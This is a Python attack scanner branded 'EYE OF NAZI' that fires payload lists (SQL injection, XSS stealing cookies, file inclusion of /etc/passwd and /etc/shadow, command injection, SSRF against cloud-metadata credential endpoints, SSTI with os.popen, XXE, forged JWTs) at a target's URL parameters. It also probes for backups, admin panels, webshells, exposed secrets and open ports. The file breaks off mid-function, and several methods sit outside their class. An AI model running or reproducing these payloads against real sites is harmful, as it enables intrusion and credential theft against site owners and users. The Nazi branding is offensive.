
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v46.0 - ULTRA EDITION
# Made by Cyber Kurd Team

import sys, os, re, ssl, time, json, socket, base64
import urllib.parse, urllib.request, urllib.error
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    ═══ EYE OF NAZI ═══\033[0m
\033[96m═══════════════════════════════════════════════════════════════════════════════════\033[0m
\033[97m\033[1m              ═══ ULTRA EDITION v46.0 ═══\033[0m
\033[2m                        Made by Cyber Kurd Team\033[0m
\033[96m═══════════════════════════════════════════════════════════════════════════════════\033[0m
"""

PAYLOADS = {
    'sqli': [
        "'", "\"", "'--", "\"--", "'#", "')", "\"))", "';--",
        "1' OR '1'='1", "1' OR 1=1--", "1' AND 1=1--", "1' AND 1=2--",
        "admin'--", "admin'#", "admin'/*", "') OR ('1'='1",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT NULL--",
        "1' ORDER BY 1--", "1' ORDER BY 100--",
        "1' AND SLEEP(3)--", "1' AND PG_SLEEP(3)--",
        "1'; WAITFOR DELAY '0:0:3'--", "1' AND BENCHMARK(5000000,MD5('a'))--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
    ],
    'xss': [
        "<script>alert(1)</script>", "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>", "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
        "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
        "<marquee onstart=alert(1)>", "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>", "</title><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>", "\"onmouseover=alert(1) x=\"",
        "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
    ],
    'lfi': [
        "../../../../../../etc/passwd", "../../../../../../etc/shadow",
        "../../../../../../etc/hosts", "../../../../../../etc/hostname",
        "../../../../../../etc/group", "../../../../../../proc/self/environ",
        "../../../../../../proc/self/cmdline", "../../../../../../proc/version",
        "../../../../../../var/log/apache2/access.log",
        "../../../../../../var/log/auth.log",
        "../../../../../../windows/win.ini",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://input", "php://stdin", "php://fd/1",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "expect://id", "file:///etc/passwd",
        "/etc/passwd", "/etc/hosts", "/proc/self/environ",
    ],
    'rce': [
        ";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)",
        ";whoami", "|whoami", "&&whoami", "$(whoami)",
        ";uname -a", "|uname -a", "$(uname -a)",
        ";ls -la", "|ls -la", "$(ls -la)",
        ";cat /etc/passwd", "|cat /etc/passwd",
        ";sleep 3", "|sleep 3", "$(sleep 3)",
        ";ping -c 1 127.0.0.1", "|ping -c 1 127.0.0.1",
    ],
    'ssrf': [
        "http://127.0.0.1", "http://127.0.0.1:80", "http://127.0.0.1:8080",
        "http://localhost", "http://localhost:8080",
        "http://[::1]", "http://0.0.0.0", "http://0177.0.0.1",
        "http://2130706433", "http://0x7f000001", "http://127.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://192.168.0.1", "http://10.0.0.1",
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:6379/_INFO",
    ],
    'redir': [
        "http://evil.com", "https://evil.com", "//evil.com",
        "///evil.com", "http:evil.com", "https:evil.com",
        "/\\evil.com", "http://evil.com@target",
    ],
    'crlf': [
        "%0d%0aInjected-Header:yes", "%0aInjected-Header:yes",
        "\r\nInjected-Header:yes", "%0d%0aSet-Cookie:crlf=1",
    ],
    'ssti': [
        "{{7*7}}", "${7*7}", "#{7*7}", "*{7*7}",
        "{{config}}", "{{self}}", "{{self.__class__}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    ],
    'xxe': [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    ],
    'jwt': [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    ],
    'graphql': [
        "{__schema{types{name}}}", "query{__typename}",
    ],
}

SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
              'staging', 'blog', 'shop', 'forum', 'support',
              'cdn', 'static', 'assets', 'img', 'm', 'mobile',
              'app', 'portal', 'vpn', 'git', 'ns1', 'ns2',
              'webmail', 'smtp', 'pop', 'imap', 'secure', 'login',
              'beta', 'alpha', 'demo', 'preview', 'qa', 'internal',
              'jenkins', 'gitlab', 'jira', 'db', 'database']

PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
         1433, 1521, 2082, 2083, 3306, 3389, 5432, 5900, 6379,
         8080, 8443, 8888, 9000, 9200, 27017, 8000, 8001, 8081]

HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'HEAD', 'TRACE']

SQL_ERR = ["sql syntax", "warning: mysql", "unclosed quotation",
           "quoted string not properly terminated", "odbc sql server",
           "sqlite3.operationalerror", "pg_query()", "postgresql",
           "ora-01756", "ora-00933", "mariadb", "sqlstate"]

LFI_IND = ["root:x:0:0", "daemon:x:", "bin:x:", "www-data:", "[extensions]"]
RCE_IND = ["uid=", "gid=", "www-data", "GNU/Linux"]
SSRF_IND = ["root:x:0:0", "ami-id", "instance-id", "meta-data", "redis_version"]

SEC_HDRS = ['Strict-Transport-Security', 'X-Frame-Options',
            'X-Content-Type-Options', 'Content-Security-Policy',
            'Referrer-Policy', 'Permissions-Policy']

PATHS = [
    '.env', '.env.local', '.env.production', '.env.backup',
    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
    'config.php.bak', 'config.json', 'config.yml',
    '.htaccess', '.htpasswd', 'web.config',
    '.git/config', '.git/HEAD', '.svn/entries',
    'backup.zip', 'backup.tar.gz', 'backup.sql',
    'www.zip', 'site.zip', 'db.sql', 'database.sql', 'dump.sql',
    'admin', 'admin/', 'administrator', 'admin.php',
    'admin/login', 'wp-admin/', 'wp-login.php',
    'phpmyadmin', 'phpMyAdmin', 'pma', 'cpanel', 'webmail',
    'phpinfo.php', 'info.php', 'test.php', 'debug.php',
    'server-status', 'robots.txt', 'sitemap.xml',
    'security.txt', '.well-known/security.txt',
    'error.log', 'access.log', 'logs/',
    'wp-json/', 'wp-json/wp/v2/users', 'wp-json/wp/v2/posts',
    'xmlrpc.php', 'wp-cron.php', 'readme.html',
    'api/', 'api/v1/', 'api/v2/', 'rest/',
    'graphql', 'swagger.json', 'openapi.json',
    'uploads/', 'files/', 'downloads/', 'tmp/', 'temp/',
    'install/', 'setup/', 'backup/',
    'db.php', 'database.php',
    'README.md', 'package.json', 'composer.json',
    'Dockerfile', 'docker-compose.yml',
]

BACKUP_FILES = [
    'backup.zip', 'backup.tar.gz', 'backup.sql',
    'www.zip', 'site.zip', 'db.sql', 'database.sql', 'dump.sql',
    'backup-2024.zip', 'backup-2023.zip', 'old.zip',
    'site_backup.zip', 'full_backup.zip',
    'wp-content.zip', 'wordpress.zip',
]

ADMIN_PATHS = [
    'admin', 'admin/', 'admin.php', 'admin/login', 'admin/login.php',
    'admin/index.php', 'administrator', 'administrator.php',
    'wp-admin/', 'wp-login.php', 'wp-admin/install.php',
    'phpmyadmin', 'phpMyAdmin', 'pma', 'mysql', 'adminer.php',
    'cpanel', 'webmail', 'plesk', 'directadmin',
    'panel', 'dashboard', 'console', 'backend', 'cms',
    'login', 'login.php', 'signin', 'auth',
]

API_ENDPOINTS = [
    'api/', 'api/v1/', 'api/v2/', 'api/v3/', 'rest/',
    'graphql', 'graphiql', 'swagger.json', 'openapi.json',
    'api-docs', 'docs', 'json', 'xml', 'rss',
]

SHELL_FILES = [
    'shell.php', 'cmd.php', 'c99.php', 'r57.php', 'b374k.php',
    'webshell.php', 'backdoor.php', 'hack.php', 'upload.php',
    'test.php', 'tmp.php', 'x.php', '1.php', 'a.php',
]

BRUTE_PASSWORDS = [
    'admin', 'password', '123456', 'admin123', 'root',
    'password123', 'admin@123', 'admin1', 'administrator',
    'qwerty', 'letmein', 'welcome', 'changeme', 'test',
]

SECRET_PATTERNS = [
    r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
    r'secret["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
    r'token["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
    r'AKIA[0-9A-Z]{16}',
    r'sk_live_[0-9a-zA-Z]{24,}',
    r'ghp_[0-9a-zA-Z]{36}',
    r'AIza[0-9A-Za-z\-_]{35}',
]

KNOWN_CVES = {
    'WordPress': {'5.0': ['CVE-2019-8942'], '5.4': ['CVE-2020-4046'],
                  '5.6': ['CVE-2021-29447'], '6.0': ['CVE-2022-21661'],
                  '6.4': ['CVE-2024-31210']},
    'Drupal': {'7': ['CVE-2018-7600'], '8': ['CVE-2019-6340']},
    'Joomla': {'3': ['CVE-2015-8562']},
    'Magento': {'2': ['CVE-2022-24086']},
    'Laravel': {'8': ['CVE-2021-3129']},
}

TAKEOVER_FINGERPRINTS = {
    'GitHub Pages': "There isn't a GitHub Pages site here",
    'Heroku': 'No such app',
    'Shopify': 'Sorry, this shop is currently unavailable',
    'AWS S3': 'NoSuchBucket',
    'Azure': '404 Web Site not found',
    'Fastly': 'Fastly error: unknown domain',
    'Zendesk': 'Help Center Closed',
}

WAF_SIGNS = {
    'Cloudflare': ['cf-ray', 'cloudflare'],
    'AWS WAF': ['x-amzn-requestid'],
    'Sucuri': ['x-sucuri-id'],
    'Imperva': ['x-iinfo'],
    'ModSecurity': ['mod_security'],
    'Wordfence': ['wordfence'],
    'Akamai': ['akamai'],
    'Fastly': ['fastly'],
    'Barracuda': ['barracuda'],
    'Fortinet': ['fortiweb'],
    'Alibaba': ['alibaba'],
}
# ═══════════════════════════════════════════════════════════════════════════
# HTTP CLIENT
# ═══════════════════════════════════════════════════════════════════════════

class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout; self.cookie = cookie; self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url, data=None, method=None, headers=None):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie: hdrs['Cookie'] = self.cookie
        if headers: hdrs.update(headers)
        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.time()
        try:
            rp = op.open(r, timeout=self.timeout); body = rp.read()
            return {'s': rp.getcode(), 'h': dict(rp.headers),
                    't': body.decode('utf-8', 'ignore'), 'n': len(body),
                    'dt': time.time() - t0, 'err': None}
        except urllib.error.HTTPError as e:
            try: body = e.read()
            except: body = b''
            return {'s': e.code, 'h': dict(e.headers) if e.headers else {},
                    't': body.decode('utf-8', 'ignore'), 'n': len(body),
                    'dt': time.time() - t0, 'err': None}
        except Exception as e:
            return {'s': 0, 'h': {}, 't': '', 'n': 0,
                    'dt': time.time() - t0, 'err': str(e)}

# ═══════════════════════════════════════════════════════════════════════════
# SCANNER CLASS
# ═══════════════════════════════════════════════════════════════════════════

class Scan:
    def __init__(self, url, cl, threads=30):
        self.url = url.rstrip('/'); self.cl = cl; self.threads = threads
        self.f = []; self.nt = 0; self.np = 0; self.npath = 0
        self.techs = []; self.waf = []; self.crawled = set()
        self.emails = set(); self.secrets = []; self.cves = []

    def add(self, u, p, t, pl, ev, sev):
        self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
                       'evidence': ev[:200] if ev else '', 'severity': sev})
        icons = {
            'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
            'XSS': '\033[43m[XSS]\033[0m', 'LFI': '\033[95m[LFI]\033[0m',
            'RCE': '\033[41m\033[97m[RCE]\033[0m', 'SSRF': '\033[94m[SSRF]\033[0m',
            'REDIR': '\033[96m[REDIR]\033[0m', 'CRLF': '\033[93m[CRLF]\033[0m',
            'SSTI': '\033[95m[SSTI]\033[0m', 'HEADER': '\033[2m[HDR]\033[0m',
            'PATH': '\033[92m[PATH]\033[0m', 'PORT': '\033[93m[PORT]\033[0m',
            'SUB': '\033[94m[SUB]\033[0m', 'SSL': '\033[95m[SSL]\033[0m',
            'HTTP': '\033[96m[HTTP]\033[0m', 'CVE': '\033[41m\033[97m[CVE]\033[0m',
            'SECRET': '\033[41m\033[97m[SEC]\033[0m', 'EMAIL': '\033[94m[MAIL]\033[0m',
            'ADMIN': '\033[92m[ADMIN]\033[0m', 'API': '\033[96m[API]\033[0m',
            'BACKUP': '\033[92m[BAK]\033[0m', 'SHELL': '\033[41m\033[97m[SHELL]\033[0m',
            'JWT': '\033[43m[JWT]\033[0m', 'GRAPHQL': '\033[95m[GQL]\033[0m',
            'CORS': '\033[95m[CORS]\033[0m', 'CLOUD': '\033[41m\033[97m[CLOUD]\033[0m',
            'BRUTE': '\033[43m[BRUTE]\033[0m', 'XXE': '\033[41m\033[97m[XXE]\033[0m',
        }
        icon = icons.get(t, f'[{t}]')
        print(f"\n  {icon} \033[1m{sev}\033[0m")
        print(f"    URL    : {u[:120]}")
        if p: print(f"    Param  : \033[93m{p}\033[0m")
        if pl: print(f"    Payload: {pl[:80]}")
        if ev: print(f"    Proof  : {ev[:200]}")

    def inject(self, url, p, pl):
        pr = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
        qs[p] = [pl]
        return urllib.parse.urlunparse((pr.scheme, pr.netloc, pr.path, pr.params,
                                         urllib.parse.urlencode(qs, doseq=True), pr.fragment))

    def params(self, url):
        q = urllib.parse.urlparse(url).query
        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys()) if q else []

    def scan_url(self, url):
        for p in self.params(url):
            self.np += 1
            print(f"  \033[2m->\033[0m \033[93m{p}\033[0m @ {url[:65]}")
            base = self.cl.req(url); b = base['t'] if not base['err'] else ''
            # SQLi
            for pl in PAYLOADS['sqli']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']: continue
                hit = False
                for err in SQL_ERR:
                    if err in r['t'].lower():
                        self.add(url, p, 'SQLI', pl, f"DB err: {err}", "CRITICAL")
                        hit = True; break
                if hit: break
            # XSS
            for pl in PAYLOADS['xss']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']: continue
                if pl in r['t']:
                    self.add(url, p, 'XSS', pl, "Reflected", "HIGH"); break
            # LFI
            for pl in PAYLOADS['lfi']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']: continue
                hit = False
                for ind in LFI_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'LFI', pl, f"Leak: {ind}", "CRITICAL")
                        hit = True; break
                if hit: break
            # RCE
            for pl in PAYLOADS['rce']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']: continue
                hit = False
                for ind in RCE_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'RCE', pl, f"Output: {ind}", "CRITICAL")
                        hit = True; break
                if hit: break
            # SSRF
            for pl in PAYLOADS['ssrf']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']: continue
                hit = False
                for ind in SSRF_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'SSRF', pl, f"Leak: {ind}", "CRITICAL")
                        hit = True; break
                if hit: break
            # Redirect
            for pl in PAYLOADS['redir']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']: continue
                loc = r['h'].get('Location', '') or r['h'].get('location', '')
                if 'evil.com' in loc:
                    self.add(url, p, 'REDIR', pl, f"-> {loc}", "MEDIUM"); break
            # CRLF
            for pl in PAYLOADS['crlf']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']: continue
                hit = False
                for hk in r['h']:
                    if 'injected' in hk.lower():
                        self.add(url, p, 'CRLF', pl, f"Inj: {hk}", "HIGH")
                        hit = True; break
                if hit: break
            # SSTI
            for pl in PAYLOADS['ssti']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']: continue
                if '49' in r['t'] and '49' not in b:
                    self.add(url, p, 'SSTI', pl, "SSTI reflected", "CRITICAL"); break

    def check_headers(self, url):
        r = self.cl.req(url)
        if r['err']: return
        missing = [h for h in SEC_HDRS
                   if not any(h.lower() == k.lower() for k in r['h'])]
        if missing:
            self.add(url, '', 'HEADER', '', f"Missing: {', '.join(missing)}", "LOW")

    def fingerprint(self, url):
        r = self.cl.req(url)
        if r['err']: return []
        det = set()
        text_low = r['t'].lower(); hdr_str = str(r['h']).lower()
        for tech, signs in {'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
                            'Drupal': ['drupal'], 'Joomla': ['joomla'],
                            'Magento': ['magento'], 'Laravel': ['laravel_session'],
                            'Django': ['csrftoken'], 'Flask': ['werkzeug'],
                            'PHP': ['PHPSESSID', 'X-Powered-By: PHP'],
                            'nginx': ['nginx'], 'Apache': ['Apache'],
                            'IIS': ['IIS'], 'Cloudflare': ['cloudflare', 'cf-ray'],
                            'React': ['react'], 'Vue': ['vue.js'],
                            'Angular': ['ng-version'], 'jQuery': ['jquery'],
                            'Bootstrap': ['bootstrap'], 'LiteSpeed': ['litespeed']}.items():
            for s in signs:
                if s.lower() in text_low or s.lower() in hdr_str:
                    det.add(tech); break
        return sorted(det)

    def detect_waf(self, url):
        test_url = url.rstrip('/') + '/?x=' + urllib.parse.quote("' OR 1=1--<script>alert(1)</script>")
        r = self.cl.req(test_url)
        if r['err']: return []
        h_low = str(r['h']).lower(); b_low = r['t'].lower()
        det = []
        for waf, signs in WAF_SIGNS.items():
            for s in signs:
                if s in h_low or s in b_low:
                    det.append(waf); break
        return det
def check_path(self, base, path):
    url = base.rstrip('/') + '/' + path.lstrip('/')
    r = self.cl.req(url)
    if r['err']: return None
    if r['s'] in (200, 301, 302, 401, 403):
        return {'url': url, 's': r['s'], 'n': r['n'], 'path': path}
    return None

def scan_paths(self, base):
    print(f"\n\033[96m[*]\033[0m Scanning {len(PATHS)} paths...")
    with ThreadPoolExecutor(max_workers=self.threads) as ex:
        futures = {ex.submit(self.check_path, base, p): p for p in PATHS}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res:
                    self.npath += 1
                    if res['s'] == 200:
                        sev = "HIGH" if any(x in res['path'] for x in
                            ['.env', '.git', 'backup', 'wp-config', 'sql']) else "MEDIUM"
                        self.add(res['url'], '', 'PATH', '', f"Status {res['s']} - {res['n']}B", sev)
                    elif res['s'] in (401, 403):
                        self.add(res['url'], '', 'PATH', '', f"Protected ({res['s']})", "INFO")
                    elif res['s'] in (301, 302):
                        self.add(res['url'], '', 'PATH', '', f"Redirect ({res['s']})", "INFO")
            except: pass

def find_admin(self, base):
    print(f"\n\033[96m[*]\033[0m Admin Finder ({len(ADMIN_PATHS)})...")
    with ThreadPoolExecutor(max_workers=self.threads) as ex:
        futures = {ex.submit(self.check_path, base, p): p for p in ADMIN_PATHS}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res and res['s'] in (200, 401, 403):
                    sev = "HIGH" if res['s'] == 200 else "MEDIUM"
                    self.add(res['url'], '', 'ADMIN', '', f"Admin ({res['s']})", sev)
            except: pass

def find_api(self, base):
    print(f"\n\033[96m[*]\033[0m API Discovery ({len(API_ENDPOINTS)})...")
    with ThreadPoolExecutor(max_workers=self.threads) as ex:
        futures = {ex.submit(self.check_path, base, p): p for p in API_ENDPOINTS}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res and res['s'] in (200, 401, 403):
                    self.add(res['url'], '', 'API', '', f"API ({res['s']})", "MEDIUM")
            except: pass

def scan_backups(self, base):
    print(f"\n\033[96m[*]\033[0m Backup Files ({len(BACKUP_FILES)})...")
    with ThreadPoolExecutor(max_workers=self.threads) as ex:
        futures = {ex.submit(self.check_path, base, p): p for p in BACKUP_FILES}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res and res['s'] == 200:
                    self.add(res['url'], '', 'BACKUP', '', f"Backup {res['n']}B", "CRITICAL")
            except: pass

def check_listing(self, url):
    print(f"\n\033[96m[*]\033[0m Directory Listing...")
    dirs = ['', 'images/', 'uploads/', 'files/', 'assets/', 'static/']
    for d in dirs:
        full = url.rstrip('/') + '/' + d
        r = self.cl.req(full)
        if not r['err'] and r['s'] == 200:
            if 'Index of /' in r['t'] or 'Directory listing' in r['t']:
                self.add(full, '', 'PATH', '', "Directory listing enabled", "HIGH")

def crawl(self, url, depth=1):
    print(f"\n\033[96m[*]\033[0m Crawling (depth={depth})...")
    to_visit = [(url, 0)]
    while to_visit:
        cur, d = to_visit.pop(0)
        if cur in self.crawled or d > depth: continue
        self.crawled.add(cur)
        r = self.cl.req(cur)
        if r['err'] or not r['t']: continue
        if '?' in cur: self.scan_url(cur)
        for m in re.finditer(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r['t']):
            email = m.group(0).lower()
            if email not in self.emails and 'example' not in email:
                self.emails.add(email)
                self.add(cur, '', 'EMAIL', '', f"Email: {email}", "INFO")
        for pat in SECRET_PATTERNS:
            for m in re.finditer(pat, r['t'], re.IGNORECASE):
                found = m.group(0)[:80]
                if found not in self.secrets:
                    self.secrets.append(found)
                    self.add(cur, '', 'SECRET', '', f"Secret: {found}", "HIGH")
        if d < depth:
            for m in re.finditer(r'href=["\']([^"\']+)["\']', r['t'], re.IGNORECASE):
                lk = m.group(1)
                if lk.startswith(('javascript:', '#', 'mailto:', 'tel:')): continue
                full = urllib.parse.urljoin(cur, lk)
                try:
                    host = urllib.parse.urlparse(self.url).netloc
                    if host in full and full not in self.crawled:
                        to_visit.append((full, d + 1))
                except: pass
    print(f"  \033[92m[+]\033[0m Crawled {len(self.crawled)} URLs")

def enum_subdomains(self, domain):
    print(f"\n\033[96m[*]\033[0m Subdomain Enumeration ({len(SUBDOMAINS)})...")
    found = []
    def check(sub):
        url = f"http://{sub}.{domain}"
        r = self.cl.req(url)
        if not r['err'] and r['s'] in (200, 301, 302, 401, 403):
            return {'url': url, 's': r['s'], 'text': r['t']}
        return None
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(check, s): s for s in SUBDOMAINS}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res:
                    found.append(res['url'])
                    self.add(res['url'], '', 'SUB', '', f"Subdomain ({res['s']})", "MEDIUM")
                    for service, fp in TAKEOVER_FINGERPRINTS.items():
                        if fp in res['text']:
                            self.add(res['url'], '', 'SUB', '', f"{service} takeover!", "CRITICAL")
            except: pass
    print(f"  \033[92m[+]\033[0m Found {len(found)} subdomain(s)")

def scan_ports(self, host):
    print(f"\n\033[96m[*]\033[0m Port Scanning {host}...")
    found = []
    def check_port(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1); result = s.connect_ex((host, p)); s.close()
            if result == 0: return p
        except: pass
        return None
    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(check_port, p): p for p in PORTS}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res:
                    found.append(res)
                    self.add(f"{host}:{res}", '', 'PORT', '', f"Port {res} open", "MEDIUM")
            except: pass
    print(f"  \033[92m[+]\033[0m Found {len(found)} open port(s)")

def check_http_methods(self, url):
    print(f"\n\033[96m[*]\033[0m HTTP Methods...")
    allowed = []
    for m in HTTP_METHODS:
        try:
            r = self.cl.req(url, method=m)
            if not r['err'] and r['s'] not in (405, 501):
                allowed.append(m)
                if m in ('PUT', 'DELETE', 'TRACE'):
                    self.add(url, '', 'HTTP', '', f"Method {m} ({r['s']})", "HIGH")
        except: pass
    print(f"  \033[92m[+]\033[0m Allowed: {', '.join(allowed) if allowed else 'none'}")

def check_ssl(self, url):
    print(f"\n\033[96m[*]\033[0m SSL/TLS Audit...")
    pr = urllib.parse.urlparse(url)
    if pr.scheme != 'https': return
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((pr.hostname, pr.port or 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=pr.hostname) as ssock:
                version = ssock.version()
                print(f"  \033[92m[+]\033[0m TLS: {version}")
                if version in ('TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3'):
                    self.add(url, '', 'SSL', '', f"Weak TLS: {version}", "HIGH")
    except Exception as e: print(f"  \033[91m[!]\033[0m {e}")
def check_cve(self, url, techs):
    print(f"\n\033[96m[*]\033[0m CVE Detection...")
    r = self.cl.req(url)
    if r['err']: return
    text = r['t'].lower()
    for tech in techs:
        if tech in KNOWN_CVES:
            for version, cves in KNOWN_CVES[tech].items():
                if version in text:
                    for cve in cves:
                        self.cves.append(cve)
                        self.add(url, '', 'CVE', '', f"{tech} {version} -> {cve}", "CRITICAL")
    if not self.cves: print(f"  \033[92m[+]\033[0m No known CVEs")

def check_dns(self, domain):
    print(f"\n\033[96m[*]\033[0m DNS Records...")
    records = {}
    try:
        import subprocess
        result = subprocess.run(['nslookup', domain],
                                capture_output=True, text=True, timeout=10)
        if result.stdout:
            for line in result.stdout.split('\n'):
                if 'Address:' in line and '#' not in line:
                    addr = line.split('Address:')[-1].strip()
                    if addr:
                        records.setdefault('A', []).append(addr)
                        print(f"  \033[92m[+]\033[0m A: {addr}")
    except Exception:
        try:
            ip = socket.gethostbyname(domain)
            records['A'] = [ip]
            print(f"  \033[92m[+]\033[0m A: {ip}")
        except: pass
    return records

def check_whois(self, domain):
    print(f"\n\033[96m[*]\033[0m Whois Lookup...")
    try:
        import subprocess
        result = subprocess.run(['whois', domain],
                                capture_output=True, text=True, timeout=15)
        if result.stdout:
            for line in result.stdout.split('\n'):
                keys = ['Registrar:', 'Creation Date:', 'Expiry Date:',
                        'Updated Date:', 'Name Server:']
                for key in keys:
                    if key.lower() in line.lower() and line.strip():
                        print(f"  \033[92m[+]\033[0m {line.strip()[:100]}")
                        break
    except Exception as e:
        print(f"  \033[93m[!]\033[0m Whois: {e}")

def analyze_js(self, url):
    print(f"\n\033[96m[*]\033[0m JavaScript Analysis...")
    r = self.cl.req(url)
    if r['err'] or not r['t']: return
    js_files = set()
    for m in re.finditer(r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']',
                         r['t'], re.IGNORECASE):
        js_files.add(m.group(1))
    print(f"  \033[92m[+]\033[0m Found {len(js_files)} JS files")
    endpoints = set()
    for js in list(js_files)[:10]:
        full = urllib.parse.urljoin(url, js)
        rj = self.cl.req(full)
        if rj['err'] or not rj['t']: continue
        for m in re.finditer(r'["\'](/[a-zA-Z0-9_\-/]+)["\']', rj['t']):
            ep = m.group(1)
            if ep not in endpoints and not ep.startswith('//'):
                endpoints.add(ep)
    for ep in list(endpoints)[:20]:
        self.add(url, '', 'JS', '', f"Endpoint: {ep}", "INFO")
    print(f"  \033[92m[+]\033[0m Found {len(endpoints)} endpoints")

def analyze_js_secrets(self, url):
    print(f"\n\033[96m[*]\033[0m JavaScript Secrets...")
    r = self.cl.req(url)
    if r['err'] or not r['t']: return
    js_files = set()
    for m in re.finditer(r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']',
                         r['t'], re.IGNORECASE):
        js_files.add(m.group(1))
    js_files.add(url)
    found = 0
    for js in list(js_files)[:15]:
        full = urllib.parse.urljoin(url, js) if not js.startswith('http') else js
        rj = self.cl.req(full)
        if rj['err'] or not rj['t']: continue
        for pat in SECRET_PATTERNS:
